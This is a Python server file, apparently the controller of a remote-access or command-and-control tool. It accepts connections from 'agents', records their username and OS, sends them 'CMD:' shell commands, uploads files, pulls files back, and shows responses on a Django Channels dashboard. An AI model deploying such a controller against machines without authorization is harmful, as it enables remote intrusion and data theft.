import os
import socket
import threading
import json
import logging
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
from django.core.cache import cache

HOST = "192.168.110.107"  # Set your host
PORT = 8888  # Set your port

# File name
CLIENTS_FILE = "connected_clients.json"

# Configure logging
logging.basicConfig(filename='server.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


cache.set('command_responses', {})


def load_clients():
    if not os.path.exists(CLIENTS_FILE):
        with open(CLIENTS_FILE, "w") as file:
            json.dump({}, file)
    try:
        with open(CLIENTS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}


def save_clients(clients):
    with open(CLIENTS_FILE, "w") as file:
        json.dump(clients, file)


def add_client(client_id, client_socket, username, client_os):
    clients = load_clients()
    client_info = {
        "socket": {
            "fd": client_socket.fileno(),
            "family": client_socket.family,
            "type": client_socket.type,
            "proto": client_socket.proto,
            "laddr": client_socket.getsockname(),
            "raddr": client_socket.getpeername()
        },
        "address": client_socket.getpeername(),
        "username": username,
        "os": client_os
    }
    clients[client_id] = client_info
    save_clients(clients)
    logging.info(f"Connected agent: {client_id}")
    print(f"\nConnected agents: {list_clients()}")
    send_clients_info_to_group()


def remove_client(client_id):
    clients = load_clients()
    if client_id in clients:
        del clients[client_id]
        save_clients(clients)
        logging.info(f"\nConnected agents: {list_clients()}")
        print(f"\nConnected agents: {list_clients()}")
        send_clients_info_to_group()


def remove_all_clients():
    clients = load_clients()
    clients.clear()
    save_clients(clients)
    logging.info(f"\nConnected agents: {list_clients()}")
    print(f"\nConnected agents: {list_clients()}")
    send_clients_info_to_group()


def list_clients():
    clients = load_clients()
    return list(clients.keys())


def send_clients_info_to_group():
    # Send updated client list to clients via WebSocket
    channel_layer = get_channel_layer()
    async_to_sync(channel_layer.group_send)(
        "client_list_group",
        {
            "type": "send_clients_info"
        }
    )


def send_command_response_to_group():
    # Send updated command response list to clients via WebSocket
    channel_layer = get_channel_layer()
    async_to_sync(channel_layer.group_send)(
        "command_responses_group",
        {
            "type": "send_command_responses"
        }
    )


class AgentHandler(threading.Thread):
    def __init__(self, agent_socket, agent_address):
        super().__init__()
        self.agent_socket = agent_socket
        self.agent_address = agent_address
        # Unique identifier for each client
        self.agent_id = f"{agent_address[0]}:{agent_address[1]}"

    def run(self):
        logging.info(f"\nNew agent connected: {self.agent_address}")
        print(f"\nNew agent connected: {self.agent_address}")
        try:
            while True:
                command_data = cache.get('command_data', {})
                agent_id = command_data.get('agent_id', '')
                command = command_data.get('command', '')
                file = command_data.get('file', None)

                if not command and not file:
                    continue

                if agent_id != self.agent_id:
                    command_responses = cache.get('command_responses', {})
                    if self.agent_id in command_responses:
                        del command_responses[self.agent_id]
                        cache.set('command_responses', command_responses)
                        send_command_response_to_group()
                    continue

                if file:
                    file_data = file.read()
                    self.agent_socket.sendall(file_data)
                    cache.set('command_data', {})
                elif command and command.startswith("DOWNLOAD:"):
                    file_name = command[len("DOWNLOAD:"):]
                    self.agent_socket.send(command.encode("utf-8"))
                    cache.set('command_data', {})
                elif command and command.startswith("CMD:"):
                    self.agent_socket.send(command.encode())
                    cache.set('command_data', {})

                    if command[len("CMD:"):].lower() == "exit":
                        cache.set('command_responses', {})
                        send_command_response_to_group()
                        break

                response = self.agent_socket.recv(4096).decode()
                responses_dict = cache.get('command_responses', {})

                if response.startswith("FILE:"):
                    file_data = response[len("FILE:"):]
                    try:
                        with open(file_name, "wb") as f:
                            f.write(file_data.encode())
                        response = f"File '{file_name}' saved successfully"
                    except Exception as e:
                        response = f"Error saving file: {e}"

                responses_dict[self.agent_id] = response
                cache.set('command_responses', responses_dict)
                send_command_response_to_group()

                logging.info(
                    f"\nResponse from agent {self.agent_address}: {response}")
                print(
                    f"\n{'=' * 20}\nResponse from agent {self.agent_address}:\n{response}\n{'=' * 20}\n")
        except Exception as e:
            logging.error(
                f"\nError communicating with agent {self.agent_address}: {e}"
            )
            print(
                f"\nError communicating with agent {self.agent_address}: {e}")
        finally:
            self.agent_socket.close()
            logging.info(f"\nAgent {self.agent_address} disconnected")
            print(f"\nAgent {self.agent_address} disconnected")
            # Remove the client from the list when disconnected
            remove_client(self.agent_id)


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        remove_all_clients()
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info(f"\nServer listening on {HOST}:{PORT}")
        print(f"\nServer listening on {HOST}:{PORT}")
        while True:
            agent_socket, agent_address = server_socket.accept()
            agent_handler = AgentHandler(agent_socket, agent_address)
            username = agent_socket.recv(4096).decode()
            client_os = agent_socket.recv(4096).decode()
            agent_handler.start()
            # Add the client to the list
            add_client(agent_handler.agent_id,
                       agent_socket, username, client_os)
    except KeyboardInterrupt:
        logging.info("\nServer shutting down...")
        print("\nServer shutting down...")
    finally:
        server_socket.close()


if __name__ == "__main__":
    main()
